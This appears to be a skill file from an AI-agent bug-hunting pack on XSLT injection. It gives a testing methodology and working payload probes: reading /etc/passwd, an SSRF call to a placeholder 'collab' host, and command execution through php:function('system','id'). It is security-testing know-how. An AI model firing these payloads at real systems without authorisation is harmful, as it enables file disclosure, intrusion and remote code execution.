---
skill: xslt-injection
title: "XSLT Injection"
category: "Security · Web"
load_when: "xslt injection, xsl injection, xml transformation, document(), php:function, xslt rce, xslt file read"
pack: SUPERAGENT V10
bughunt: true
---

# XSLT Injection

## Where it pays
Apps that transform XML with user-controlled XSLT can leak files, SSRF, or RCE depending on the processor — rare but high-impact.

## Attack-surface signals
XML→HTML/PDF rendering, report generators, SOAP pipelines, anything accepting a stylesheet or XSL parameters.

## Methodology
1. Fingerprint the processor (libxslt, Saxon, Xalan) via error/version probes. 2. File read via `document()`/`unparsed-text()`. 3. SSRF via `document('http://collab')`. 4. RCE via extension functions (`php:function`, `xalan:` Java) where enabled.

## Payloads / probes
```
<xsl:value-of select="system-property('xsl:version')"/>
<xsl:value-of select="unparsed-text('/etc/passwd')"/>
<xsl:value-of select="document('http://collab/')"/>
<xsl:value-of select="php:function('system','id')"/>
```

## Root causes
User-controlled stylesheet/params; extension functions enabled; no sandbox on the XSLT processor.

## Validation gate
Show file read, an OOB SSRF hit, version disclosure, or extension-function execution.

## Impact & chains
File disclosure, SSRF, RCE. Chains with web/ssrf and web/xxe.

## 🧪 Try it locally
```bash
python3 ../../../tools/skill_router.py "xslt injection, xsl injection, xml transformation, document(), php:function, xslt rce, xslt file read"
```

→ Report with `../reporting/writeup.md` (CWE-91); validate with `../reporting/validation-gate.md`.
